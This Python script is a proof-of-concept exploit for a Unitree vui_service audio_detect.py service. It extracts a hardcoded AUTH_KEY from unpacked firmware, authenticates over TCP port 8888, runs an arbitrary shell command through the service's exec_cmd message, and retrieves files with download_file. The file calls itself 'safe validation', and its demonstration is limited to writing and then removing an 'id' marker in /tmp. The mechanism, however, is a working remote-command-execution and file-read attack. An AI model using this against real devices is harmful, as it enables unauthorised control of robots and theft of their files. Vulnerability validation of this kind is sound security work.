#!/usr/bin/env python3
"""Safe dynamic validation for vui_service/bin/audio_detect.py.

The script extracts the fixed AUTH_KEY from the local unpacked firmware file,
but never prints it. It performs a minimal proof by creating a temporary marker
under /tmp with `id` output, reading it back through the service protocol, and
then removing it.
"""

from __future__ import annotations

import argparse
import json
import re
import socket
import sys
import time
from pathlib import Path


DEFAULT_AUDIO_DETECT = (
    Path(__file__).resolve().parents[2]
    / "extracted"
    / "modules_unpacked"
    / "vui_service_2.2.0.19"
    / "vui_service_2.2.0.19"
    / "module"
    / "vui_service"
    / "file"
    / "unitree"
    / "module"
    / "vui_service"
    / "bin"
    / "audio_detect.py"
)


def extract_auth_key(path: Path) -> str:
    text = path.read_text(encoding="utf-8", errors="replace")
    match = re.search(r"^\s*AUTH_KEY\s*=\s*['\"]([^'\"]+)['\"]", text, re.M)
    if not match:
        raise RuntimeError(f"AUTH_KEY not found in {path}")
    return match.group(1)


def connect_and_auth(host: str, port: int, auth_key: str, timeout: float) -> socket.socket:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    sock.sendall(auth_key.encode("utf-8"))
    response = sock.recv(4096)
    if response != b"AUTH_SUCCESS":
        try:
            decoded = response.decode("utf-8", errors="replace")
        finally:
            sock.close()
        raise RuntimeError(f"auth failed: {decoded!r}")
    return sock


def send_json(sock: socket.socket, obj: dict[str, str]) -> bytes:
    sock.sendall(json.dumps(obj, separators=(",", ":")).encode("utf-8"))
    return sock.recv(4096)


def exec_cmd(host: str, port: int, auth_key: str, timeout: float, cmd: str) -> bytes:
    with connect_and_auth(host, port, auth_key, timeout) as sock:
        return send_json(sock, {"type": "exec_cmd", "cmd": cmd})


def heartbeat(host: str, port: int, auth_key: str, timeout: float) -> bytes:
    with connect_and_auth(host, port, auth_key, timeout) as sock:
        return send_json(sock, {"type": "heartbeat"})


def download_file(host: str, port: int, auth_key: str, timeout: float, remote_path: str) -> bytes:
    with connect_and_auth(host, port, auth_key, timeout) as sock:
        sock.sendall(json.dumps({"type": "download_file", "path": remote_path}).encode("utf-8"))
        first = sock.recv(4096)
        if first == b"FILE_NOT_FOUND":
            raise FileNotFoundError(remote_path)

        try:
            size = int(first.decode("utf-8", errors="strict"))
        except ValueError as exc:
            raise RuntimeError(f"unexpected download header: {first!r}") from exc

        sock.sendall(b"OK")
        chunks: list[bytes] = []
        remaining = size
        while remaining > 0:
            chunk = sock.recv(min(4096, remaining))
            if not chunk:
                break
            chunks.append(chunk)
            remaining -= len(chunk)
        data = b"".join(chunks)
        if len(data) != size:
            raise RuntimeError(f"incomplete download: expected {size}, got {len(data)}")
        return data


def main() -> int:
    parser = argparse.ArgumentParser(description="Validate audio_detect.py command execution safely.")
    parser.add_argument("host", help="Target host/IP")
    parser.add_argument("--port", type=int, default=8888)
    parser.add_argument("--audio-detect", type=Path, default=DEFAULT_AUDIO_DETECT)
    parser.add_argument("--timeout", type=float, default=3.0)
    parser.add_argument("--keep-marker", action="store_true", help="Do not remove the temporary marker file.")
    args = parser.parse_args()

    auth_key = extract_auth_key(args.audio_detect)
    marker = f"/tmp/codex_audio_detect_ci_{int(time.time())}.txt"
    proof_cmd = f"id > {marker} 2>&1"
    cleanup_cmd = f"rm -f {marker}"

    print(f"target={args.host}:{args.port}")
    print(f"auth_source={args.audio_detect}")
    print("auth=loaded_redacted")

    hb = heartbeat(args.host, args.port, auth_key, args.timeout)
    print(f"heartbeat={hb.decode('utf-8', errors='replace')}")

    exec_response = exec_cmd(args.host, args.port, auth_key, args.timeout, proof_cmd)
    print(f"exec_response={exec_response.decode('utf-8', errors='replace')}")
    print(f"marker={marker}")

    proof = None
    for _ in range(10):
        time.sleep(0.3)
        try:
            proof = download_file(args.host, args.port, auth_key, args.timeout, marker)
            break
        except FileNotFoundError:
            continue
    if proof is None:
        raise RuntimeError("marker was not created or could not be downloaded")

    print(f"proof_size={len(proof)}")
    print("proof_begin")
    sys.stdout.write(proof.decode("utf-8", errors="replace").strip() + "\n")
    print("proof_end")

    if not args.keep_marker:
        cleanup_response = exec_cmd(args.host, args.port, auth_key, args.timeout, cleanup_cmd)
        print(f"cleanup_response={cleanup_response.decode('utf-8', errors='replace')}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
